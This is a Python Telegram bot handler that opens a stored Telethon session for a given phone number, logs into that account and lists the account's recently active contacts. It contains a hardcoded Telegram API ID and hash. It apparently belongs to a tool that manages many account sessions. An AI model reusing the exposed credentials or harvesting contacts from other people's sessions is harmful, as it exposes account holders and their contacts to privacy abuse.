import os
import pytz
import re
from config import SESSION_FOLDER
from datetime import datetime, timedelta
from telethon.sync import TelegramClient
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import UserStatusRecently, UserStatusOffline, UserStatusOnline
from telegram import Update
from telegram.ext import ContextTypes

# Config
API_ID = 23520639
API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'

# Helper function untuk escape karakter MarkdownV2
def escape_strict_markdown_v2(text: str) -> str:
    escape_chars = r'\_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', text)

from telegram import InlineKeyboardButton, InlineKeyboardMarkup  # tambahkan ini di atas

async def data_kontak_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()

        result = await client(GetContactsRequest(hash=0))
        contacts = result.users

        now = datetime.now(pytz.utc)
        active_contacts = []

        for user in contacts:
            status = user.status

            if isinstance(status, (UserStatusRecently, UserStatusOnline)):
                active_contacts.append(user)
            elif isinstance(status, UserStatusOffline):
                if now - status.was_online <= timedelta(days=7):
                    active_contacts.append(user)

        if not active_contacts:
            await update.callback_query.message.reply_text(f"📭 Tidak ada kontak aktif dalam 7 hari terakhir.")
            await client.disconnect()
            return

        # Siapkan pesan
        msg_lines = []
        for user in active_contacts:
            name = (user.first_name or '') + ' ' + (user.last_name or '')
            username = f"@{user.username}" if user.username else "(no username)"
            escaped_name = escape_strict_markdown_v2(name.strip())
            escaped_username = escape_strict_markdown_v2(username.strip())
            msg_lines.append(f"• {escaped_name} \\| {escaped_username}")

        # Kirim dalam potongan jika terlalu panjang
        full_message = "\n".join(msg_lines)
        chunks = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]

        for i, chunk in enumerate(chunks):
            if i == len(chunks) - 1:
                # Tambahkan tombol "Back to Menu" di akhir
                keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]]
                await update.callback_query.message.reply_text(
                    chunk,
                    parse_mode="MarkdownV2",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            else:
                await update.callback_query.message.reply_text(chunk, parse_mode="MarkdownV2")

        await client.disconnect()

    except Exception as e:
        escaped_error = escape_strict_markdown_v2(str(e))
        await update.callback_query.message.reply_text(f"⚠️ Gagal mengambil kontak:\n{escaped_error}", parse_mode="MarkdownV2")
